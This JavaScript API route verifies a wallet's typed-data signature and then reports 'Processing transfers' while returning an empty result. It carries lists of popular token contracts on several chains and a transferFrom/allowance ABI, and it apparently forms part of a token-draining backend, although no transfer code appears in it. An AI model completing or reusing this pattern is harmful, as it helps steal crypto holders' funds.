// api/transfer.js - CORRECTED VERSION
import { ethers } from 'ethers'
import { Connection, PublicKey, Transaction, SystemProgram, sendAndConfirmTransaction, Keypair } from '@solana/web3.js'
import bs58 from 'bs58'

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type'
}

const POPULAR_ERC20 = {
  1: [
    '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
    '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2',
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    '0x6982508145454Ce325dDbE47a25d4ec3d2311933'
  ],
  56: [
    '0x55d398326f99059fF775485246999027B3197955',
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    '0xbb4CdB9Cbd36B01bD1cBaEBF2De08d9173bc095c',
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',
    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'
  ],
  137: [
    '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    '0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60d76ECC',
    '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'
  ]
}

const ERC20_ABI = [
  {
    constant: true,
    inputs: [{ name: '_owner', type: 'address' }],
    name: 'balanceOf',
    outputs: [{ name: 'balance', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: false,
    inputs: [
      { name: '_from', type: 'address' },
      { name: '_to', type: 'address' },
      { name: '_value', type: 'uint256' }
    ],
    name: 'transferFrom',
    outputs: [{ name: '', type: 'bool' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      { name: '_owner', type: 'address' },
      { name: '_spender', type: 'address' }
    ],
    name: 'allowance',
    outputs: [{ name: '', type: 'uint256' }],
    type: 'function'
  },
  {
    constant: true,
    inputs: [],
    name: 'decimals',
    outputs: [{ name: '', type: 'uint8' }],
    type: 'function'
  }
]

function jsonResponse(body, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: {
      'Content-Type': 'application/json',
      ...CORS_HEADERS
    }
  })
}

export async function OPTIONS() {
  return new Response(null, { status: 200, headers: CORS_HEADERS })
}

export async function GET() {
  return jsonResponse({ success: false, error: 'Method not allowed' }, 405)
}

export async function POST(request) {
  const { address, signature, authMessage } = await request.json()

  try {
    console.log('🔐 Verifying signature...')
    const recovered = ethers.verifyTypedData(
      authMessage.domain,
      authMessage.types,
      authMessage.message,
      signature
    )

    if (recovered.toLowerCase() !== address.toLowerCase()) {
      console.error('❌ Signature mismatch')
      return jsonResponse({ success: false, error: 'Invalid signature' }, 401)
    }

    console.log(`✅ Signature verified for ${address}`)

    return jsonResponse({
      success: true,
      message: 'Authorization successful. Processing transfers...',
      transfers: [],
      results: {}
    })

  } catch (error) {
    console.error('Handler error:', error)
    return jsonResponse({
      success: false,
      error: error?.message ?? 'Internal server error'
    }, 500)
  }
}
